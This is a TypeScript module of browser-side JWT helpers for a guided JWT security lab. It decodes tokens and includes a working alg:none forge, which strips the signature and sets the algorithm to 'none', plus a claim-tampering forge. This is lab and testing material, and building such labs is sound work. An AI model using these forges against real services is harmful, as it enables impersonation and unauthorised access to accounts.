/** Browser-side JWT helpers for the guided JWT lab (decode + classic alg:none forge). */

function b64urlToJson(part: string): unknown {
  const pad = "=".repeat((4 - (part.length % 4)) % 4);
  const b64 = (part + pad).replace(/-/g, "+").replace(/_/g, "/");
  const json = decodeURIComponent(
    Array.from(atob(b64))
      .map((c) => "%" + c.charCodeAt(0).toString(16).padStart(2, "0"))
      .join(""),
  );
  return JSON.parse(json);
}

function jsonToB64url(obj: unknown): string {
  const json = JSON.stringify(obj);
  const b64 = btoa(unescape(encodeURIComponent(json)));
  return b64.replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}

export function looksLikeJwt(token: string): boolean {
  const t = token.trim();
  const parts = t.split(".");
  return parts.length === 3 && parts.every((p) => p.length > 0);
}

export type DecodedJwt = {
  header: Record<string, unknown>;
  payload: Record<string, unknown>;
  signature: string;
};

export function decodeJwt(token: string): DecodedJwt {
  const parts = token.trim().split(".");
  if (parts.length !== 3) throw new Error("Not a JWT (need header.payload.signature)");
  return {
    header: b64urlToJson(parts[0]) as Record<string, unknown>,
    payload: b64urlToJson(parts[1]) as Record<string, unknown>,
    signature: parts[2],
  };
}

/** Classic algorithm-confusion attempt: alg=none, empty signature. */
export function forgeAlgNone(token: string): string {
  const { header, payload } = decodeJwt(token);
  const forgedHeader = { ...header, alg: "none" };
  return `${jsonToB64url(forgedHeader)}.${jsonToB64url(payload)}.`;
}

/** Flip a claim so signature cannot match (still keeps original alg — server must reject). */
export function forgeTamperedClaim(token: string): string {
  const { header, payload, signature } = decodeJwt(token);
  const next = {
    ...payload,
    sub: String(payload.sub || "user") + "-tampered",
    guided_forge: true,
  };
  return `${jsonToB64url(header)}.${jsonToB64url(next)}.${signature}`;
}
